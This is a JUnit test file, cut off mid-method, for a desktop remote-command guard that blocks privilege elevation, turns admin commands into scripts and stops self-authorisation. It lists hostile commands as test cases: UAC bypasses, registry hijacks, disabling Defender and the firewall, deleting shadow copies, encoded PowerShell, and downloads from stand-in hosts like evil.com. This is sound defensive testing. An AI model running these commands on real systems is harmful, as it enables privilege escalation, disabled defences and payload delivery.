package com.onesay.desktop;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertTrue;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;

import org.junit.After;
import org.junit.Test;

/**
 * link-v2 · 电脑端安全插件：每条规则的正例 / 反例 + 绕过写法（大小写、cmd 拼接、^ 转义、环境变量、8.3 短名、-enc、UNC），
 * 以及两轴（沙箱档 × 审批策略）的矩阵、旧配置兼容、三条关不掉的硬规则、插件出错即拒。
 *
 * <p>原则（用户定的）：普通用户能做的事不拦，Windows 自己会挡没有管理员的操作。插件只强制：永不提权、需要管理员 → 只生成脚本、禁止自授权。
 */
public class PcPluginTest {

    static final LinkPolicy.Verdict A = LinkPolicy.Verdict.ALLOW, C = LinkPolicy.Verdict.CONFIRM, D = LinkPolicy.Verdict.DENY, S = LinkPolicy.Verdict.SCRIPT;
    static final LinkPolicy.Sandbox RO = LinkPolicy.Sandbox.READ_ONLY, WS = LinkPolicy.Sandbox.WORKSPACE_WRITE, FA = LinkPolicy.Sandbox.FULL_ACCESS;
    static final LinkPolicy.Approval UN = LinkPolicy.Approval.UNTRUSTED, OR = LinkPolicy.Approval.ON_REQUEST, NV = LinkPolicy.Approval.NEVER;

    @After public void restoreElevation() {
        SafeExec.reset(null, null);
        SafeExec.REMOTE.set(Boolean.FALSE);
    }

    static Map<String, Object> m(Object... kv) { return PcGuardTest.m(kv); }

    static String reason(PcGuard.Outcome o) { return PcGuardTest.reason(o); }

    static Config cfg(LinkPolicy.Sandbox sb, LinkPolicy.Approval ap) throws Exception {
        Config c = PcGuardTest.cfg("auto");
        c.setMode(new LinkPolicy.Mode(sb, ap));
        return c;
    }

    static LinkPolicy.Rules rules() { return new LinkPolicy.Rules(true, List.of("github.com"), List.of("c:\\users\\me\\appdata\\roaming\\onesay\\desktop.properties")); }

    static String code(String cmd) {
        LinkPolicy.Hit h = LinkPolicy.inspectCommand(cmd, rules());
        return h == null ? "" : h.code;
    }

    // ================================================================== 两轴矩阵

    @Test public void twoAxisMatrix() {
        // 沙箱档 × 审批策略 × 类别。S = 只生成脚本，C = 电脑上确认，D = 拒绝，A = 直接做。
        Object[][] rows = {
                //                                只读:分类/按需/从不   工作区可写:分类/按需/从不   完全访问:分类/按需/从不
                {LinkPolicy.Cat.QUERY, A, A, A, A, A, A, A, A, A},
                {LinkPolicy.Cat.READ_PRIVATE, D, D, D, A, A, A, A, A, A},
                {LinkPolicy.Cat.HARMLESS, D, D, D, A, A, A, A, A, A},
                {LinkPolicy.Cat.OPEN_APP, D, D, D, A, A, A, A, A, A},
                {LinkPolicy.Cat.WORKSPACE_WRITE, D, D, D, A, A, A, A, A, A},
                {LinkPolicy.Cat.SIMPLE_SETTING, D, D, D, C, C, D, C, C, A},
                {LinkPolicy.Cat.POWER, D, D, D, C, C, D, C, C, A},
                {LinkPolicy.Cat.UNINSTALL_APP, D, D, D, C, C, D, C, C, A},
                {LinkPolicy.Cat.APP_OPERATE, D, D, D, D, D, D, A, A, A},
                {LinkPolicy.Cat.OUTSIDE_WRITE, D, D, D, S, S, S, A, A, A},
                {LinkPolicy.Cat.RUN_WS_SCRIPT, D, D, D, D, D, D, C, C, A},
                {LinkPolicy.Cat.SHELL_EXEC, D, D, D, S, S, S, C, C, A},
                // 需要管理员 / 给自己授权：任何一格都只生成脚本（永不提权）
                {LinkPolicy.Cat.SYSTEM_A, S, S, S, S, S, S, S, S, S},
                {LinkPolicy.Cat.NET_SEC_SETTING, S, S, S, S, S, S, S, S, S},
                {LinkPolicy.Cat.SELF_GRANT, S, S, S, S, S, S, S, S, S},
                // 远程改 OneSay 自己的设置 / 系统程序 / 没登记的指令：任何一格都拒
                {LinkPolicy.Cat.SELF_AUTHORIZE, D, D, D, D, D, D, D, D, D},
                {LinkPolicy.Cat.SYSTEM_APP_OP, D, D, D, D, D, D, D, D, D},
                {LinkPolicy.Cat.UNKNOWN, D, D, D, D, D, D, D, D, D}};
        for (Object[] r : rows) {
            int i = 1;
            for (LinkPolicy.Sandbox sb : LinkPolicy.Sandbox.values()) {
                for (LinkPolicy.Approval ap : LinkPolicy.Approval.values()) {
                    LinkPolicy.Decision d = LinkPolicy.decide(LinkPolicy.Target.PC, new LinkPolicy.Mode(sb, ap), (LinkPolicy.Cat) r[0], new LinkPolicy.Facts());
                    assertEquals(r[0] + " " + sb.id + "/" + ap.id, r[i++], d.verdict);
                }
            }
        }
        // 原因码
        assertEquals(LinkPolicy.R_NEEDS_ADMIN_SCRIPT, LinkPolicy.decide(LinkPolicy.Target.PC, LinkPolicy.Mode.DEFAULT, LinkPolicy.Cat.SYSTEM_A, null).reason);
        assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, LinkPolicy.decide(LinkPolicy.Target.PC, LinkPolicy.Mode.DEFAULT, LinkPolicy.Cat.SELF_AUTHORIZE, null).reason);
        assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, LinkPolicy.decide(LinkPolicy.Target.PC, new LinkPolicy.Mode(WS, NV), LinkPolicy.Cat.POWER, null).reason);
        for (String c : new String[]{LinkPolicy.R_PLUGIN_BLOCKED, LinkPolicy.R_NEEDS_ADMIN_SCRIPT, LinkPolicy.R_SELF_GRANT_BLOCKED})
            assertFalse(c, LinkPolicy.reasonZh(c).isEmpty());
        assertEquals("plugin_blocked", LinkPolicy.R_PLUGIN_BLOCKED);
        assertEquals("needs_admin_script", LinkPolicy.R_NEEDS_ADMIN_SCRIPT);
        assertEquals("self_grant_blocked", LinkPolicy.R_SELF_GRANT_BLOCKED);
    }

    @Test public void defaultsAndLegacyConfigMapping() throws Exception {
        assertEquals(WS, LinkPolicy.Mode.DEFAULT.sandbox);
        assertEquals(UN, LinkPolicy.Mode.DEFAULT.approval);
        // 旧三档 → 两轴
        assertEquals(new LinkPolicy.Mode(RO, UN), LinkPolicy.Mode.ofLegacy(LinkPolicy.Level.READ_ONLY));
        assertEquals(new LinkPolicy.Mode(WS, UN), LinkPolicy.Mode.ofLegacy(LinkPolicy.Level.AUTO));
        assertEquals(new LinkPolicy.Mode(FA, OR), LinkPolicy.Mode.ofLegacy(LinkPolicy.Level.FULL));
        // 两轴 → 旧档（给旧手机 / 旧界面看）
        assertEquals(LinkPolicy.Level.FULL, new LinkPolicy.Mode(FA, NV).legacy());
        assertEquals(LinkPolicy.Level.AUTO, new LinkPolicy.Mode(WS, NV).legacy());
        assertEquals(LinkPolicy.Level.READ_ONLY, new LinkPolicy.Mode(RO, OR).legacy());
        assertEquals(WS, LinkPolicy.Sandbox.of("乱写"));
        assertEquals(UN, LinkPolicy.Approval.of(null));
        assertEquals(FA, LinkPolicy.Sandbox.of("完全访问"));

        // 旧配置文件（只有 pc_level=full）读进来 = 完全访问 · 按需；新配置优先
        Path f = Files.createTempFile("plug", ".properties");
        Files.writeString(f, "pc_level=full\n");
        Config old = Config.load(f);
        assertEquals("full_access", old.pcSandbox);
        assertEquals("on_request", old.pcApproval);
        assertEquals("full", old.level().id);
        Files.writeString(f, "pc_level=full\npc_sandbox=read_only\npc_approval=never\n");
        Config neu = Config.load(f);
        assertEquals("read_only", neu.mode().sandbox.id);
        assertEquals("never", neu.mode().approval.id);
        assertEquals("旧字段跟着两轴走", "read_only", neu.pcLevel);
        // 存了再读回来；pc_level 仍写进去给旧版本看
        neu.setMode(new LinkPolicy.Mode(WS, OR));
        neu.pluginEnabled = false;
        neu.pluginEncoded = false;
        neu.netAllow = "github.com";
        neu.save();
        String text = Files.readString(neu.file);
        assertTrue(text, text.contains("pc_level=auto") && text.contains("pc_sandbox=workspace_write") && text.contains("pc_approval=on_request"));
        Config back = Config.load(neu.file);
        assertEquals(new LinkPolicy.Mode(WS, OR), back.mode());
        assertFalse(back.pluginEnabled);
        assertFalse(back.pluginEncoded);
        assertEquals("github.com", back.netAllow);
        // 默认：插件开、编码拦截开、工作区可写 · 分类
        Config fresh = new Config(Files.createTempFile("plug2", ".properties"));
        assertTrue(fresh.pluginEnabled && fresh.pluginEncoded);
        assertEquals(LinkPolicy.Mode.DEFAULT, fresh.mode());
    }

    // ================================================================== 规则：正例 / 反例

    @Test public void neverElevate() {
        String[] yes = {"Start-Process cmd -Verb RunAs", "runas /user:Administrator cmd.exe", "powershell -Command \"Start-Process x -Verb runAs\"",
                "psexec -s cmd", "gsudo notepad", "schtasks /create /tn x /tr y /rl HIGHEST", "fodhelper.exe", "eventvwr.msc",
                "computerdefaults.exe", "sdclt.exe", "wsreset.exe", "cmstp.exe /au x.inf", "[Diagnostics.Process]::Start('x','','runas')"};
        for (String c : yes) assertEquals(c, LinkPolicy.R_PLUGIN_BLOCKED, code(c));
        String[] no = {"Start-Process notepad", "powershell -Command Get-Date", "schtasks /query", "explorer.exe D:\\照片",
                "robocopy D:\\照片 E:\\备份 /E", "Remove-Item C:\\Users\\me\\Desktop\\旧文件.txt", "taskkill /im notepad.exe"};
        for (String c : no) assertEquals(c, "", code(c));
    }

    @Test public void adminGoesToScriptNotDenial() {
        // 需要管理员 → 类别 SYSTEM_A（任何档位只生成脚本），不是插件的 deny
        String[] admin = {"reg add HKLM\\SOFTWARE\\X /v a /d 1 /f", "reg delete HKU\\S-1-5-21-1\\Software\\X /f", "reg load HKLM\\Tmp x.hiv",
                "sc config WinDefend start= disabled", "New-Service -Name x -BinaryPathName y", "net stop wuauserv", "pnputil /add-driver x.inf",
                "netsh advfirewall set allprofiles state off", "netsh winhttp set proxy 1.2.3.4:8080", "Set-DnsClientServerAddress -InterfaceAlias Wi-Fi -ServerAddresses 1.1.1.1",
                "Disable-NetAdapter -Name 以太网", "notepad C:\\Windows\\System32\\drivers\\etc\\hosts", "route add 10.0.0.0 mask 255.0.0.0 10.0.0.1",
                "schtasks /create /tn x /tr y /ru SYSTEM", "Register-ScheduledTask -TaskName x -User SYSTEM", "bcdedit /set testsigning on",
                "diskpart /s x.txt", "format D: /q", "vssadmin delete shadows /all", "wbadmin start backup", "net user bob /add",
                "net localgroup administrators bob /add", "Set-ExecutionPolicy Bypass", "msiexec /i x.msi /qn"};
        for (String c : admin) {
            assertEquals(c, "", code(c)); // 插件不拦
            LinkPolicy.Cat cat = LinkPolicy.classifyShell(LinkPolicy.Target.PC, c);
            assertTrue(c + " → " + cat, cat == LinkPolicy.Cat.SYSTEM_A || cat == LinkPolicy.Cat.SELF_GRANT);
            for (LinkPolicy.Sandbox sb : LinkPolicy.Sandbox.values())
                for (LinkPolicy.Approval ap : LinkPolicy.Approval.values()) {
                    LinkPolicy.Decision d = LinkPolicy.decide(LinkPolicy.Target.PC, new LinkPolicy.Mode(sb, ap), cat, null);
                    assertEquals(c + " " + sb.id + "/" + ap.id, S, d.verdict);
                    assertEquals(c, LinkPolicy.R_NEEDS_ADMIN_SCRIPT, d.reason);
                }
            assertFalse(c, LinkPolicy.adminReason(LinkPolicy.normalizeCommand(c)).isEmpty() && LinkPolicy.classifyShell(LinkPolicy.Target.PC, c) == LinkPolicy.Cat.SYSTEM_A
                    && LinkPolicy.hkcuElevationReason(LinkPolicy.normalizeCommand(c)).isEmpty());
        }
        // 普通用户自己能做的：不是 SYSTEM_A
        String[] user = {"reg add HKCU\\Software\\MyApp /v a /d 1 /f", "Set-ItemProperty -Path HKCU:\\Software\\MyApp -Name a -Value 1",
                "Remove-Item -Recurse C:\\Users\\me\\Downloads\\旧的", "del /q C:\\Users\\me\\Desktop\\a.txt", "copy a.txt b.txt",
                "schtasks /create /tn 我的任务 /tr notepad.exe /sc daily", "setx MYVAR 1", "Get-Process", "Set-ExecutionPolicy Bypass -Scope CurrentUser"};
        for (String c : user) {
            assertEquals(c, "", code(c));
            assertEquals(c, LinkPolicy.Cat.SHELL_EXEC, LinkPolicy.classifyShell(LinkPolicy.Target.PC, c));
        }
    }

    @Test public void hkcuElevationKeysStillScriptOnly() {
        // HKCU 放开，但能影响提权的键仍然只生成脚本
        String[] bad = {"reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d cmd.exe /f",
                "reg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /d cmd /f",
                "reg add HKCU\\Software\\Classes\\exefile\\shell\\open\\command /ve /d evil /f",
                "New-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command -Name DelegateExecute -Value ''",
                "reg add HKCU\\Environment /v windir /d \"cmd /c evil\" /f",
                "Set-ItemProperty HKCU:\\Environment -Name COR_PROFILER -Value {x}",
                "reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v x /d 1 /f",
                "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /d 1 /f"};
        for (String c : bad) {
            assertFalse(c, LinkPolicy.hkcuElevationReason(LinkPolicy.normalizeCommand(c)).isEmpty());
            assertEquals(c, LinkPolicy.Cat.SYSTEM_A, LinkPolicy.classifyShell(LinkPolicy.Target.PC, c));
            assertEquals(c, S, LinkPolicy.decide(LinkPolicy.Target.PC, new LinkPolicy.Mode(FA, OR), LinkPolicy.Cat.SYSTEM_A, null).verdict);
        }
        String[] ok = {"reg add HKCU\\Software\\Classes\\.txt /ve /d mytype /f", "reg add HKCU\\Software\\MyApp\\Settings /v theme /d dark /f",
                "reg add HKCU\\Environment /v MYPATH /d C:\\tools /f",
                "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f"};
        for (String c : ok) {
            assertEquals(c, "", LinkPolicy.hkcuElevationReason(LinkPolicy.normalizeCommand(c)));
            assertEquals(c, LinkPolicy.Cat.SHELL_EXEC, LinkPolicy.classifyShell(LinkPolicy.Target.PC, c));
        }
    }

    @Test public void noSelfAuthorize() {
        String[] yes = {"notepad %APPDATA%\\OneSay\\desktop.properties", "Set-Content $env:APPDATA\\OneSay\\desktop.properties 'pc_level=full'",
                "echo pc_sandbox=full_access >> cfg", "curl http://127.0.0.1:47830/api/settings", "taskkill /im OneSay.exe",
                "Stop-Process -Name OneSay", "reg add x /v trusted_domains /d evil.com /f", "echo plugin_enabled=off"};
        for (String c : yes) assertEquals(c, LinkPolicy.R_SELF_GRANT_BLOCKED, code(c));
        for (String cmd : new String[]{"settings", "pc_level", "sandbox_set", "approval_set", "plugin_off", "trust_add", "shortcut_approve"})
            assertEquals(cmd, LinkPolicy.Cat.SELF_AUTHORIZE, LinkPolicy.pcCat(cmd));
        assertEquals("", code("notepad D:\\我的笔记.txt"));
    }

    @Test public void encodedCommandsAreASeparateSwitchableRule() {
        String[] enc = {"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "powershell -EncodedCommand QQBBAEEAQQBBAEEAQQBBAEEAQQA=",
                "$x=[Convert]::FromBase64String('QUJD')", "iex (irm https://github.com/a.ps1)", "Invoke-Expression $cmd"};
        for (String c : enc) assertEquals(c, LinkPolicy.R_PLUGIN_BLOCKED, code(c));
        // 规则项关掉（配置 plugin_encoded=off）后不再拦
        LinkPolicy.Rules off = new LinkPolicy.Rules(false, List.of("github.com"), null);
        for (String c : enc) {
            LinkPolicy.Hit h = LinkPolicy.inspectCommand(c, off);
            assertTrue(c + " → " + h, h == null || !LinkPolicy.R_PLUGIN_BLOCKED.equals(h.code) || !h.text.contains("编码"));
        }
        assertEquals("", code("powershell -NoProfile -Command Get-Date"));
    }

    @Test public void sandboxIsOfflineByDefaultWithAllowList() {
        LinkPolicy.Rules r = rules();
        assertEquals("白名单内放行", null, LinkPolicy.inspectCommand("curl https://github.com/user/repo", r));
        assertEquals("子域也算", null, LinkPolicy.inspectCommand("Invoke-WebRequest https://raw.github.com/a", r));
        for (String c : new String[]{"curl https://evil.example/x", "wget http://1.2.3.4/a", "Invoke-RestMethod https://api.evil.com",
                "(New-Object Net.WebClient).DownloadString('https://evil.com/a')", "certutil -urlcache -f https://evil.com/a a.exe",
                "net use \\\\fileserver\\share", "copy \\\\nas\\公共\\a.txt ."})
            assertEquals(c, LinkPolicy.R_PLUGIN_BLOCKED, code(c));
        // 完全访问档：沙箱不断网
        LinkPolicy.Rules open = new LinkPolicy.Rules(true, List.of(), null);
        open.net = false;
        assertNull(LinkPolicy.inspectCommand("curl https://evil.example/x", open));
        assertEquals("没联网的命令不受影响", "", code("Get-ChildItem D:\\"));
    }

    @Test public void workspaceGitAndAgentDirsAreReadOnly() throws Exception {
        for (String p : new String[]{".git/config", ".git\\hooks\\pre-commit", "notes/.codex/x", ".agents/a.md", ".CODEX/x"})
            assertTrue(p, LinkPolicy.protectedWorkspacePath(p));
        for (String p : new String[]{"notes/a.txt", "gitignore/x", "my.git.txt", "agents.md"}) assertFalse(p, LinkPolicy.protectedWorkspacePath(p));
        Config c = cfg(WS, UN);
        PcGuard g = new PcGuard(c, new PcGuardTest.Stub());
        PcGuard.Outcome o = g.check("phone", "file_write", m("path", ".git/config", "text", "x"));
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, reason(o));
        assertFalse(g.builtin("file_write", m("path", ".git/config", "text", "x")).ok);
        assertFalse(Files.exists(Path.of(c.workspaceDir, ".git", "config")));
        assertNull("工作区里别的地方照写", g.check("phone", "file_write", m("path", "notes/a.txt", "text", "x")).reply);
        assertEquals("%USERPROFILE% 下的工作区", "C:\\Users\\me\\OneSay\\workspace", LinkPolicy.pcWorkspaceDir("C:\\Users\\me", "C:\\ProgramData"));
        assertEquals("非 ASCII 用户目录退到 ProgramData", "C:\\ProgramData\\OneSay\\workspace", LinkPolicy.pcWorkspaceDir("C:\\Users\\刘泓江", "C:\\ProgramData"));
    }

    // ================================================================== 绕过写法

    @Test public void normalizationDefeatsBypasses() {
        // 大小写
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, code("START-PROCESS CMD -VERB RUNAS"));
        // cmd /c 拼接外壳
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, code("cmd /c start-process cmd -verb runas"));
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, code("cmd.exe /s /c \"powershell -Command Start-Process x -Verb RunAs\""));
        assertEquals(LinkPolicy.Cat.SYSTEM_A, LinkPolicy.classifyShell(LinkPolicy.Target.PC, "cmd /c reg add HKLM\\Software\\X /f"));
        // ^ 与反引号转义
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, code("start-process cmd -v^e^r^b runas"));
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, code("Start-Process cmd -Verb `R`u`n`A`s"));
        assertEquals(LinkPolicy.Cat.SYSTEM_A, LinkPolicy.classifyShell(LinkPolicy.Target.PC, "reg add \"HK\"LM\\Software\\X /f"));
        // 环境变量
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, code("%SystemRoot%\\System32\\fodhelper.exe"));
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, code("$env:SystemRoot\\System32\\fodhelper.exe"));
        assertEquals(LinkPolicy.Cat.SYSTEM_A, LinkPolicy.classifyShell(LinkPolicy.Target.PC, "notepad %SystemRoot%\\System32\\drivers\\etc\\hosts"));
        // 8.3 短名
        assertEquals("c:\\program files\\x.exe", LinkPolicy.normalizeCommand("C:\\PROGRA~1\\x.exe"));
        assertEquals("c:\\windows\\system32\\fodhelper.exe", LinkPolicy.normalizeCommand("C:\\WINDOW~1\\SYSTEM~1\\fodhelper.exe"));
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, code("C:\\WINDOW~1\\System32\\fodhelper.exe"));
        // -enc：解出来的内容也要过规则
        String b64 = java.util.Base64.getEncoder().encodeToString("Start-Process cmd -Verb RunAs".getBytes(java.nio.charset.StandardCharsets.UTF_16LE));
        assertTrue(LinkPolicy.normalizeCommand("powershell -enc " + b64).contains("start-process cmd -verb runas"));
        LinkPolicy.Rules noEnc = new LinkPolicy.Rules(false, List.of(), null);
        noEnc.net = false;
        assertEquals("就算不拦编码本身，解出来的提权也拦", LinkPolicy.R_PLUGIN_BLOCKED, LinkPolicy.inspectCommand("powershell -enc " + b64, noEnc).code);
        String b64reg = java.util.Base64.getEncoder().encodeToString("reg add HKLM\\Software\\X /f".getBytes(java.nio.charset.StandardCharsets.UTF_16LE));
        assertEquals(LinkPolicy.Cat.SYSTEM_A, LinkPolicy.classifyShell(LinkPolicy.Target.PC, "powershell -EncodedCommand " + b64reg));
        // UNC
        assertEquals("fileserver", LinkPolicy.uncHost(LinkPolicy.normalizeCommand("type \\\\fileserver\\share\\a.txt")));
        assertEquals("nas", LinkPolicy.uncHost("//nas/public/a"));
        assertNull("设备路径不是 UNC 主机", LinkPolicy.uncHost("\\\\?\\C:\\x"));
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, code("type \\\\fileserver\\share\\a.txt"));
        // 空白 / 多空格 / 全角空格
        assertEquals("start-process cmd -verb runas", LinkPolicy.normalizeCommand("  Start-Process   cmd\t-Verb  RunAs \n"));
    }

    @Test public void commentsDoNotFalselyTrigger() {
        // .ps1：# 行注释与 <# #> 块注释剥掉
        assertEquals("", LinkPolicy.shortcutBodyBlocked("# 这个脚本不改 proxy、firewall，也不用 reg add HKLM\nStart-Process notepad", "a.ps1", null));
        assertEquals("", LinkPolicy.shortcutBodyBlocked("<#\nnetsh advfirewall set allprofiles state off\n#>\nStart-Process notepad", "a.ps1", null));
        assertEquals("", LinkPolicy.shortcutBodyBlocked("Start-Process notepad # 以前这里是 reg add HKLM\\X", "a.ps1", null));
        // .bat：REM 与 ::
        assertEquals("", LinkPolicy.shortcutBodyBlocked("@echo off\r\nREM 改代理用的，现在不改了\r\n:: netsh winhttp set proxy\r\nstart notepad\r\n", "a.bat", null));
        // 引号里的 # 不是注释，照样匹配
        assertFalse(LinkPolicy.shortcutBodyBlocked("Write-Host \"# \"; reg add HKLM\\Software\\X /f", "a.ps1", null).isEmpty());
        // 真的在代码里就拦
        assertFalse(LinkPolicy.shortcutBodyBlocked("# 说明\nnetsh advfirewall set allprofiles state off", "a.ps1", null).isEmpty());
        assertTrue(LinkPolicy.stripComments("REM x\r\nstart a", true).trim().equals("start a"));
        assertTrue(LinkPolicy.stripComments("a # b\nc", false).contains("c"));
        assertFalse(LinkPolicy.stripComments("a # b\nc", false).contains("b"));
    }

    // ================================================================== 永不提权（子进程）

    @Test public void subprocessNeverElevates() throws Exception {
        List<String> wrapped = new ArrayList<>();
        SafeExec.reset(() -> false, pb -> { wrapped.add(String.join(" ", pb.command())); return pb; });
        // 命令行里想提权：本机触发也拒
        for (String[] cmd : new String[][]{{"powershell", "-Command", "Start-Process cmd -Verb RunAs"}, {"runas", "/user:Administrator", "cmd"},
                {"cmd", "/c", "fodhelper.exe"}}) {
            try {
                SafeExec.check(new ProcessBuilder(cmd));
                org.junit.Assert.fail("应拒：" + Arrays.toString(cmd));
            } catch (SafeExec.Refused e) {
                assertTrue(e.getMessage(), e.getMessage().contains("永远不提权"));
            }
        }
        assertNotNull(SafeExec.check(new ProcessBuilder("notepad.exe", "a.txt")));
        assertTrue("没提权时不需要降权", wrapped.isEmpty());

        // OneSay 自己是管理员 + 远程触发 → 要降权
        SafeExec.reset(() -> true, null);
        SafeExec.REMOTE.set(Boolean.TRUE);
        try {
            SafeExec.check(new ProcessBuilder("notepad.exe"));
            org.junit.Assert.fail("没有降权能力时应拒");
        } catch (SafeExec.Refused e) {
            assertTrue(e.getMessage(), e.getMessage().contains("降权"));
        }
        // 有降权实现就用它
        SafeExec.reset(() -> true, pb -> { wrapped.add("deelevated:" + String.join(" ", pb.command())); return pb; });
        assertNotNull(SafeExec.check(new ProcessBuilder("notepad.exe")));
        assertEquals(1, wrapped.size());
        assertTrue(wrapped.get(0).startsWith("deelevated:"));
        // 本机触发（不是远程）照常
        SafeExec.REMOTE.set(Boolean.FALSE);
        SafeExec.reset(() -> true, null);
        assertNotNull(SafeExec.check(new ProcessBuilder("notepad.exe")));
        // 检测不了 = 当作管理员（出错即拒）
        SafeExec.reset(() -> { throw new IllegalStateException("检测不了"); }, null);
        assertTrue(SafeExec.elevated());
        SafeExec.REMOTE.set(Boolean.TRUE);
        try {
            SafeExec.checkInProcessWrite();
            org.junit.Assert.fail("管理员 + 远程写工作区外应拒");
        } catch (SafeExec.Refused e) {
            assertTrue(e.getMessage(), e.getMessage().contains("管理员"));
        }
        SafeExec.REMOTE.set(Boolean.FALSE);
        SafeExec.checkInProcessWrite();
    }

    /** 要管理员的命令永远走不到执行端（只生成脚本）。 */
    @Test public void adminNeverReachesExecutor() throws Exception {
        for (LinkPolicy.Sandbox sb : LinkPolicy.Sandbox.values()) {
            for (LinkPolicy.Approval ap : LinkPolicy.Approval.values()) {
                Config c = cfg(sb, ap);
                PcGuardTest.Stub st = new PcGuardTest.Stub();
                st.answer = PcGuard.ALLOW; // 就算有人点允许
                PcGuard g = new PcGuard(c, st);
                PcGuard.Outcome o = g.check("phone", "sys_exec", m("command", "netsh advfirewall set allprofiles state off"));
                assertEquals(sb.id + "/" + ap.id, LinkPolicy.R_NEEDS_ADMIN_SCRIPT, reason(o));
                String rel = String.valueOf(o.reply.data.get("path"));
                File f = new File(c.workspaceDir, rel);
                assertTrue(rel, rel.endsWith(".ps1") && f.isFile());
                String body = Files.readString(f.toPath());
                assertTrue(body, body.startsWith("\uFEFF# 由 OneSay 远程指令生成，没有执行"));
                assertTrue("脚本里写明为什么要管理员", body.contains("需要管理员"));
                assertTrue(body.contains("netsh advfirewall set allprofiles state off"));
                assertTrue(o.reply.text, o.reply.text.contains("管理员身份执行"));
                assertEquals("从不问", 0, st.asked.size());
            }
        }
    }

    // ================================================================== 守卫 + 插件串起来

    @Test public void guardAppliesPluginAtEveryMode() throws Exception {
        for (LinkPolicy.Sandbox sb : LinkPolicy.Sandbox.values()) {
            Config c = cfg(sb, OR);
            c.netAllow = "github.com";
            PcGuardTest.Stub st = new PcGuardTest.Stub();
            st.answer = PcGuard.ALLOW;
            PcGuard g = new PcGuard(c, st);
            assertEquals(sb.id, LinkPolicy.R_PLUGIN_BLOCKED, reason(g.check("phone", "sys_exec", m("command", "Start-Process cmd -Verb RunAs"))));
            assertEquals(sb.id, LinkPolicy.R_SELF_GRANT_BLOCKED, reason(g.check("phone", "sys_exec", m("command", "notepad %APPDATA%\\OneSay\\desktop.properties"))));
            assertEquals(sb.id, LinkPolicy.R_PLUGIN_BLOCKED, reason(g.check("phone", "sys_exec", m("command", "powershell -enc QUJDREVGR0hJSktMTU5PUFFS"))));
        }
        // 工作区可写：默认断网，白名单外的域名插件直接拦；白名单内的照常（工作区可写下命令本身只生成脚本）
        Config w = cfg(WS, OR);
        w.netAllow = "github.com";
        PcGuard gw = new PcGuard(w, new PcGuardTest.Stub());
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, reason(gw.check("phone", "sys_exec", m("command", "curl https://evil.example/x"))));
        assertEquals(LinkPolicy.R_SCRIPT_GENERATED, reason(gw.check("phone", "sys_exec", m("command", "curl https://github.com/x"))));
        // 完全访问（Codex 的 full access 有网络）：不断网，确认后执行
        Config c = cfg(FA, OR);
        PcGuardTest.Stub st = new PcGuardTest.Stub();
        st.answer = PcGuard.ALLOW;
        PcGuard g = new PcGuard(c, st);
        assertNull(g.check("phone", "sys_exec", m("command", "curl https://evil.example/x")).reply);
    }

    @Test public void pluginOffKeepsThreeHardRules() throws Exception {
        Config c = cfg(FA, OR);
        c.pluginEnabled = false;
        PcGuardTest.Stub st = new PcGuardTest.Stub();
        st.answer = PcGuard.ALLOW;
        PcGuard g = new PcGuard(c, st);
        // 关不掉的三条
        assertEquals("永不提权", LinkPolicy.R_PLUGIN_BLOCKED, reason(g.check("phone", "sys_exec", m("command", "Start-Process cmd -Verb RunAs"))));
        assertEquals("需要管理员 → 脚本", LinkPolicy.R_NEEDS_ADMIN_SCRIPT, reason(g.check("phone", "sys_exec", m("command", "sc config WinDefend start= disabled"))));
        assertEquals("禁止自授权", LinkPolicy.R_SELF_GRANT_BLOCKED, reason(g.check("phone", "sys_exec", m("command", "Stop-Process -Name OneSay"))));
        // 关掉的那条：编码命令不再拦
        assertNull(g.check("phone", "sys_exec", m("command", "powershell -enc QUJDREVGR0hJSktMTU5PUFFS")).reply);

        // 开关本身：打开直接开，关掉要二次确认
        Config x = cfg(WS, UN);
        assertEquals("关掉安全插件要再确认一次", App.pluginSwitch(x, "false", null));
        assertTrue(x.pluginEnabled);
        assertNull(App.pluginSwitch(x, "false", Boolean.TRUE));
        assertFalse(x.pluginEnabled);
        assertNull(App.pluginSwitch(x, "true", null));
        assertTrue(x.pluginEnabled);
    }

    /** 插件自己出错 = 拒绝，不放行。 */
    @Test public void pluginFailureIsRefusal() throws Exception {
        Config c = cfg(FA, OR);
        PcGuardTest.Stub st = new PcGuardTest.Stub();
        st.answer = PcGuard.ALLOW;
        PcGuard g = new PcGuard(c, st);
        g.pluginFault = () -> { throw new IllegalStateException("炸了"); };
        PcGuard.Outcome o = g.check("phone", "sys_exec", m("command", "Get-Date"));
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, reason(o));
        assertTrue(o.reply.text, o.reply.text.contains("出错"));
        assertEquals("没问人", 0, st.asked.size());
        g.pluginFault = null;
        assertNull(g.check("phone", "sys_exec", m("command", "Get-Date")).reply);
    }

    /** 远程不能改 OneSay 自己的档位 / 插件 / 信任列表：没有这样的指令，有也一律拒。 */
    @Test public void remoteCannotChangeOwnPolicy() throws Exception {
        Config c = cfg(FA, OR);
        PcGuardTest.Stub st = new PcGuardTest.Stub();
        st.answer = PcGuard.ALLOW;
        PcGuard g = new PcGuard(c, st);
